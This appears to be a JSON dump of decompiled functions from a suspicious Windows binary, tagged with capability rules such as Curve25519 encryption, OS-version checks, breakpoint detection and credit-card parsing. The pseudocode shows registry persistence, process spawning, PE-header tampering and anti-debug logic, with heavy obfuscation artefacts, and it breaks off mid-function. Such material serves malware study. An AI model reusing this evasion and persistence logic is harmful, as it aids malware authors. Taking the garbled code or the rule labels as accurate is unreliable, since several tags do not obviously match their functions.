{
    "00401030": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401072) overlaps instruction at (ram,0x0040106f)\n// \n// WARNING: Removing unreachable block (ram,0x00401066)\n\nbool fcn.00401030(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_4h = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x407478, 0x4074a0, &var_8h, &var_10ch, &var_4h);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&var_10ch, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&var_10ch);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 380
    },
    "00402010": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402073) overlaps instruction at (ram,0x00402072)\n// \n\nvoid __cdecl fcn.00402010(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint8_t *unaff_EBX;\n    uint32_t uVar3;\n    bool bVar4;\n    \n    uVar3 = 0;\n    if (arg_14h != 0) {\n        do {\n            uVar2 = *(uVar3 + arg_10h) ^ *(uVar3 % arg_ch + arg_8h);\n            if ((uVar2 < '\\0') || (iVar1 = arg_8h,  uVar2 >= '\\0')) {\n                *(uVar3 + arg_10h) = uVar2;\n                uVar3 = uVar3 + 1;\n                iVar1 = arg_14h;\n            }\n            *unaff_EBX = *unaff_EBX & 0xc3;\n            bVar4 = iVar1 + 0xe40ce22bU < uVar3;\n            uVar3 = iVar1 + 0xe40ce22bU;\n        } while (bVar4);\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "004027a0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004028c4)\n// WARNING: Removing unreachable block (ram,0x004027e7)\n// WARNING: Removing unreachable block (ram,0x004027ef)\n// WARNING: Removing unreachable block (ram,0x004027f2)\n// WARNING: Removing unreachable block (ram,0x00402773)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004027a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    uint *puVar4;\n    bool bVar5;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar4 = &var_213h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    s = 0;\n    puVar4 = &var_10fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    var_ch = 1;\n    *(puVar4 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407048, 0xe8, arg_8h);\n    fcn.004024a0(&var_4h, &var_8h);\n    iVar2 = fcn.00401a40(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    bVar5 = iVar2 == 0;\n    if (bVar5) {\n        return 0;\n    }\n    if ((!bVar5) && (bVar5)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar2 = fcn.00401ef0(&s, var_4h, var_8h);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    fcn.00402f30();\n    iVar2 = fcn.004043c0(0x407080);\n    if (iVar2 == -1) {\n        iVar2 = fcn.004043c0(0x407074);\n        if (iVar2 == -1) goto code_r0x00402950;\n        uVar3 = 0xf;\n    }\n    else {\n        uVar3 = 0xe;\n    }\n    iVar2 = fcn.00401bb0(arg_8h);\n    if (iVar2 != 0) {\n        fcn.00402cf0(uVar3);\n        fcn.00402c30(uVar3);\n        return 1;\n    }\n    if (*0x42374c == 0) {\n        return 0;\n    }\ncode_r0x00402950:\n    iVar1 = fcn.00401cb0(arg_8h, &s);\n    iVar2 = var_ch;\n    if (iVar1 == 0) {\n        iVar2 = 0;\n    }\n    if ((iVar2 != 0) && (iVar1 = fcn.00404350(arg_8h),  iVar1 == 0)) {\n        var_ch = 0;\n        iVar2 = iVar1;\n    }\n    if (iVar2 == 0) {\n        iVar2 = fcn.00404ed0(arg_8h, 0);\n        var_ch = iVar2;\n    }\n    if (iVar2 != 0) {\n        fcn.00402c30(0xff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(0xe8);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x407094, 0);\n    return iVar2;\n}\n",
        "token_count": 969
    },
    "004044b0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nint64_t fcn.004044b0(void)\n\n{\n    uint32_t extraout_EDX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT44(extraout_EDX, 1);\n    }\n    return extraout_EDX << 0x20;\n}\n",
        "token_count": 137
    },
    "00401120": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040117b) overlaps instruction at (ram,0x00401176)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint32_t __cdecl fcn.00401120(uint s1)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    ushort in_SS;\n    bool bVar6;\n    uint uStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack40 = s1;\n    (*_sym.imp.MSVCRT.dll__strlwr)();\n    bVar6 = (POPCOUNT(&stack0xffffffdc & 0xff) & 1U) == 0;\n    if ((!bVar6) && (bVar6)) {\n        puVar2 = segment(in_SS, *0x10 + -0x24);\n        if (0xfffffffb < &uStack40) {\n            pcVar1 = *puVar2 + 0x52;\n            *pcVar1 = *pcVar1 + -0x5b;\n            goto code_r0x0040117f;\n        }\n        if (bVar6) {\n            return *puVar2;\n        }\n    }\n    var_14h = 0x407458;\n    var_10h = 0x407450;\n    var_ch = 0x407460;\n    var_8h = 0x407468;\n    var_4h = 0x407470;\ncode_r0x0040117f:\n    uVar5 = 0;\n    puVar4 = &var_14h;\n    do {\n        uStack40 = *puVar4;\n        iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(s1);\n        if (iVar3 != 0) {\n            return 1;\n        }\n        uVar5 = uVar5 + 1;\n        puVar4 = puVar4 + 1;\n    } while (uVar5 < 5);\n    uStack40 = 0x407448;\n    iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(s1);\n    return iVar3 == 0;\n}\n",
        "token_count": 520
    },
    "00403150": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004032b5) overlaps instruction at (ram,0x004032b0)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403150(int16_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint32_t *in_EAX;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint8_t extraout_CL;\n    int16_t *in_ECX;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    bool bVar8;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((&stack0xfffffffc < 0xc) || (&stack0xfffffffc >= 0xc)) {\n        if (*arg_8h != 0x5a4d) {\n            return 0;\n        }\n        uVar4 = *(arg_8h + 0x1e);\n        in_EAX = uVar4 + arg_8h;\n        if ((CARRY4(uVar4, arg_8h) || in_EAX == NULL) || (!CARRY4(uVar4, arg_8h) && in_EAX != NULL)) {\n            if (*in_EAX != 0x4550) {\n                return 0;\n            }\n            if (in_EAX[0x16] != 0) {\n                return 0;\n            }\n            var_4h = 0x40;\n            if (*(arg_8h + 0x1e) < 0x81) {\n                return 0;\n            }\n            if (*(arg_8h + 0x1e) < 0xc0) {\n                var_4h = *(arg_8h + 0x1e) - 0x80;\n            }\n            puVar2 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(var_4h);\n            if (puVar2 != NULL) {\n                if ((puVar2 < 1) || (0 < puVar2)) {\n                    bVar7 = false;\n                    bVar8 = var_4h == 0;\n                    var_8h = 0;\n                    puVar5 = puVar2;\n                }\n                else {\n                    *(puVar2 + -0x7ac625aa) = *(puVar2 + -0x7ac625aa) ^ extraout_CL;\n                    uVar1 = puVar2;\n                    *puVar2 = *puVar2 + uVar1;\n                    bVar7 = CARRY1(*puVar2, uVar1);\n                    *puVar2 = *puVar2 + uVar1;\n                    bVar8 = *puVar2 == '\\0';\n                    puVar5 = puVar2 + 1;\n                }\n                if (!bVar7 && !bVar8) {\n                    do {\n                        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n                        uVar4 = var_8h + 1;\n                        *(var_8h + puVar2) = iVar3 % 0xff;\n                        puVar5 = puVar2;\n                        var_8h = uVar4;\n                    } while (uVar4 < var_4h);\n                }\n                puVar2 = puVar5;\n                puVar6 = arg_8h + 0x40;\n                for (uVar4 = var_4h >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n                    *puVar6 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                for (var_4h = var_4h & 3; var_4h != 0; var_4h = var_4h - 1) {\n                    *puVar6 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar5);\n                return 1;\n            }\n            return 0;\n        }\n        in_ECX = arg_8h;\n        if (!SCARRY4(uVar4, arg_8h)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    if (*in_EAX <= &stack0xffffffe4 && in_EAX != 0xffffffff) {\n        fcn.00404d60(in_ECX, 0xffffffff, 0xb7f8c08b);\n        return 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 1071
    },
    "00404810": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nbool fcn.00404810(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EDI;\n    float10 extraout_ST0;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00402c40(0x80000002, 0x407308, 0x407348, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n        *(unaff_EDI + 0x1c) = extraout_ST0;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch);\n    return iVar1 != -1;\n}\n",
        "token_count": 201
    },
    "004048b0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004048b0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00402c40(0x80000002, 0x4071f0, 0x40723c, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 135
    },
    "00404ed0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404ed0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x4070a4, arg_8h);\n    (*pcVar2)(&var_264h, 0x4070bc, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4070e4;\n    var_30h = 0x4070f0;\n    var_2ch = 0x4070fc;\n    var_28h = 0x40710c;\n    var_24h = 0x407114;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1094
    },
    "00401830": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401960) overlaps instruction at (ram,0x0040195f)\n// \n// WARNING: Variable defined which should be unmapped: var_25fh\n\nvoid fcn.00401830(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint unaff_EBX;\n    uchar *unaff_ESI;\n    uint *puVar4;\n    uint unaff_EDI;\n    uint *puVar5;\n    bool bVar6;\n    unkbyte6 Var7;\n    uchar *in_stack_fffffd74;\n    uchar *in_stack_fffffd78;\n    uchar *puVar8;\n    uchar lpszPath;\n    uint var_25fh;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    puVar8 = &stack0xfffffffc;\n    bVar6 = false;\n    iVar2 = fcn.00403cc0(unaff_EDI, unaff_ESI, unaff_EBX, _lpszPath);\n    if ((bVar6) || (!bVar6)) {\n        iVar2 = fcn.00401030();\n        if (iVar2 == 0) {\n            return;\n        }\n    }\n    else {\n        piVar3 = iVar2 + -0x83d18;\n        *piVar3 = *piVar3 + piVar3;\n        *(iVar2 + -0x83cb2) = *(iVar2 + -0x83cb2) + (piVar3 >> 8);\n        unaff_ESI = in_stack_fffffd74;\n        puVar8 = in_stack_fffffd78;\n    }\n    puVar8[-0x260] = 0;\n    puVar4 = puVar8 + -0x25f;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    Var7 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n    bVar6 = Var7 != 0;\n    if (bVar6) {\n        if ((bVar6) && (!bVar6)) {\n            out(*unaff_ESI, Var7 >> 0x20);\n        }\n        fcn.00401d60();\n        puVar8[-0x15c] = 0;\n        puVar4 = puVar8 + -0x15b;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        (*_sym.imp.MSVCRT.dll_sprintf)(puVar8 + -0x15c, 0x4073c4, puVar8 + -0x260, 0x4073a4, 3);\n        *(puVar8 + -0x14) = 0;\n        puVar4 = _sym.imp.KERNEL32.dll_Sleep;\n        do {\n            puVar5 = puVar8 + -0x58;\n            for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *(puVar8 + -0x28) = 0;\n            *(puVar8 + -0x10) = 0;\n            *(puVar8 + -0xc) = 0;\n            *(puVar8 + -0x58) = 0x44;\n            *(puVar8 + -8) = 0;\n            *(puVar8 + -0x2c) = 1;\n            *(puVar8 + -4) = 0;\n            *puVar5 = *puVar4;\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, puVar8 + -0x15c, 1, 1, 1, 1, 1, 1, 0x8df04d8d, puVar8);\n            if (iVar2 == 0) {\n                return;\n            }\n            (*(puVar4 + 1))(3000);\n            (*_sym.imp.USER32.dll_EnumWindows)(fcn.00401730, *(puVar8 + -8));\n            iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(puVar8 + -0x10), 1000);\n            if (iVar2 == 0x102) {\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)(*(puVar8 + -0x10), 1);\n            }\n            pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(*(puVar8 + -0xc));\n            (*pcVar1)(*(puVar8 + -0x10));\n            iVar2 = *(puVar8 + -0x14);\n            *(puVar8 + -0x14) = iVar2 + 1;\n            puVar4 = puVar4 + 1;\n        } while (iVar2 + 1 < 1);\n    }\n    return;\n}\n",
        "token_count": 1251
    },
    "00404b80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404bcc) overlaps instruction at (ram,0x00404bcb)\n// \n// WARNING: Removing unreachable block (ram,0x00404bbe)\n// WARNING: Removing unreachable block (ram,0x00404bc8)\n// WARNING: Removing unreachable block (ram,0x00404bcd)\n\nbool __cdecl fcn.00404b80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401d60();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004042a0();\n        arg_ch_01 = fcn.004042a0();\n        arg_ch_02 = fcn.004042a0();\n        fcn.00404d00(arg_10h, arg_ch_00);\n        fcn.00404d00(arg_8h, arg_ch_01);\n        fcn.00404d00(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x40703c, &lpBuffer, arg_10h);\n        iVar2 = fcn.00402130(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407048, &lpBuffer, arg_8h);\n            iVar2 = fcn.00402130(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407048, &lpBuffer, arg_ch);\n                iVar2 = fcn.00402130(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00404d00(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 690
    },
    "00401a40": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401b98) overlaps instruction at (ram,0x00401b97)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t * __cdecl fcn.00401a40(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t **in_ECX;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    unkbyte6 Var9;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    if ((0x23 < &stack0xfffffffc && *0x10 != 0x28) && (0x23 >= &stack0xfffffffc || *0x10 == 0x28)) {\n        if (!SBORROW4(&stack0xfffffffc, 0x24)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        piVar2 = *in_ECX;\n        if (piVar2 != NULL) {\n            piVar2 = (**(*piVar2 + 8))(piVar2);\n        }\n        return piVar2;\n    }\n    puVar3 = fcn.00403f50(arg_18h, arg_1ch, 0x40706c, 7);\n    puVar6 = _sym.imp.MSVCRT.dll_rand;\n    if (puVar3 == NULL) {\n        return NULL;\n    }\n    var_24h = 0;\n    puVar7 = &var_23h;\n    var_4h = puVar3;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    bVar8 = false;\n    uVar5 = 0;\n    do {\n        if ((!bVar8) && (bVar8)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        Var9 = (*puVar6)();\n        (&var_24h)[uVar5] = Var9;\n        uVar5 = uVar5 + 1;\n        bVar8 = SBORROW4(uVar5, 0x20);\n    } while (uVar5 < 0x20);\n    if ((uVar5 == 0x20) || (uVar5 != 0x20)) {\n        iVar4 = 8;\n    }\n    else {\n        uVar1 = in(Var9 >> 0x20);\n        *puVar6 = uVar1;\n        iVar4 = extraout_ECX;\n        if (&stack0xffffffcc < 1) goto code_r0x00401b3a;\n    }\n    *(iVar4 + 8) = *(iVar4 + 8) ^ puVar3 >> 8;\n    puVar6 = &var_24h;\n    for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar3 = puVar3 + 1;\n    }\ncode_r0x00401b3a:\n    fcn.00404900(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n    fcn.00402a40(arg_18h, arg_1ch);\n    return 0x1;\n}\n",
        "token_count": 888
    },
    "00402a40": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402a40(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    iVar1 = fcn.00404050(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    *(iVar1 + 0x58) = arg_ch;\n    fcn.00404050(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 162
    },
    "00403350": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403896) overlaps instruction at (ram,0x00403893)\n// \n// WARNING: Removing unreachable block (ram,0x0040352d)\n// WARNING: Removing unreachable block (ram,0x004035cb)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403350(void)\n\n{\n    int32_t *piVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint8_t *puVar5;\n    char extraout_CL;\n    char extraout_CL_00;\n    uint8_t extraout_CL_01;\n    char extraout_CH;\n    char extraout_CH_00;\n    uint8_t extraout_CH_01;\n    char extraout_CH_02;\n    uint8_t extraout_DH;\n    int32_t extraout_EDX;\n    int32_t iVar6;\n    int32_t extraout_EDX_00;\n    uint8_t extraout_DH_00;\n    int32_t extraout_EDX_01;\n    uint8_t uVar8;\n    char *unaff_EBX;\n    char *pcVar7;\n    char *unaff_EBP;\n    int16_t iVar9;\n    uint8_t **unaff_ESI;\n    uint8_t **ppuVar10;\n    uint8_t **unaff_EDI;\n    uchar *puVar11;\n    uint8_t **ppuVar12;\n    uint8_t **ppuVar13;\n    uint16_t in_SS;\n    bool bVar14;\n    uchar uVar15;\n    bool bVar16;\n    uint8_t in_AF;\n    uchar uVar17;\n    char cVar18;\n    char cVar19;\n    ulong uVar20;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint8_t **ppuStack44;\n    uint8_t **ppuStack40;\n    char *pcStack36;\n    uint8_t **ppuStack32;\n    uint8_t **ppuStack28;\n    char *pcStack24;\n    \n    ppuStack28._0_2_ = in_SS;\n    do {\n        pcStack24 = 0x13;\n        ppuStack28 = 0x407014;\n        ppuStack32 = 0x403380;\n        fcn.004042d0();\n        bVar14 = extraout_DH < 0x36;\n        bVar16 = (POPCOUNT(extraout_DH - 0x36) & 1U) == 0;\n        pcStack24 = 0x13;\n        ppuStack28 = 0x407014;\n        ppuStack32 = 0x4033a5;\n        ppuStack44 = unaff_EDI;\n        ppuStack40 = unaff_ESI;\n        pcStack36 = unaff_EBP;\n        fcn.004042d0();\n        if ((bVar16) || (!bVar16)) goto code_r0x004033c9;\n        segment(ppuStack28, *0x10 + -0x1c);\n        if (bVar14) goto code_r0x004033ea;\n    } while (bVar16);\n    ppuStack28 = 0xb7bc9ea5;\ncode_r0x004033c9:\n    ppuStack32 = 0x4;\n    pcStack36 = str.i5J;\n    ppuStack40 = 0x13;\n    ppuStack44 = 0x407014;\n    uStack48 = 0x4033dc;\n    fcn.004042d0();\ncode_r0x004033ea:\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x4033fd;\n    fcn.004042d0();\n    uVar15 = 0xffffffef < &stack0xffffffe4;\n    uVar17 = unaff_EBX == 0xffffffff;\n    pcStack24 = 0x13;\n    ppuStack28 = 0x407014;\n    ppuStack32 = 0x40341c;\n    fcn.004042d0();\n    ppuStack32 = 0xb;\n    pcStack36 = 0x407074;\n    ppuStack40 = 0x13;\n    ppuStack44 = 0x407014;\n    uStack48 = 0x40343b;\n    uVar3 = fcn.004042d0();\n    if ((!uVar15 && !uVar17) && (uVar15 || uVar17)) {\n        uVar15 = 0;\n        uVar17 = (uVar3 & 0xe2f4cc58) == 0;\n    }\n    uStack48 = 0xc;\n    uStack52 = 0x407080;\n    uStack56 = 0x13;\n    pcVar4 = fcn.004042d0(0x407014);\n    pcVar7 = unaff_EBX;\n    if ((uVar17) || (!uVar17)) {\ncode_r0x00403470:\n        uVar2 = fcn.004042d0(0x407014, 0x13, 0x40708c, 8);\n        uVar3 = ((uVar2 & 0xff00 | uVar2 & pcVar7 >> 8) ^ 0x6200) - 0x3488 & 0x7ee5;\n        